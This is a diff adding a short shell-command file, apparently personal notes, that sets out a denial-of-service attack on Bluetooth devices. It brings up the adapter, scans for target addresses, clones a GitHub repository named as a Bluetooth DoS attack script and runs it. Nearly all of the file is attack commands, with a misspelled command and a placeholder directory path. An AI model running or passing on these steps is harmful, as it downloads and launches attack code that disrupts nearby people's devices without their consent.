@@ -1,0 +1,18 @@
+######## This command can dos attack Bluetooth device
+
+
+# Check Bluetooth adapter
+hciconfig -a
+
+# Start Bluetooth adapter
+hcicofig hci0 up
+
+# Scan Bluetooth ( Find target device address )
+hcitool scan
+
+# Git clone tool
+git clone https://github.com/crypt0b0y/BLUETOOTH-DOS-ATTACK-SCRIPT.git
+cd /git-directory
+
+# Start dos attack
+python3 Bluetooth-DOS-Attack.py
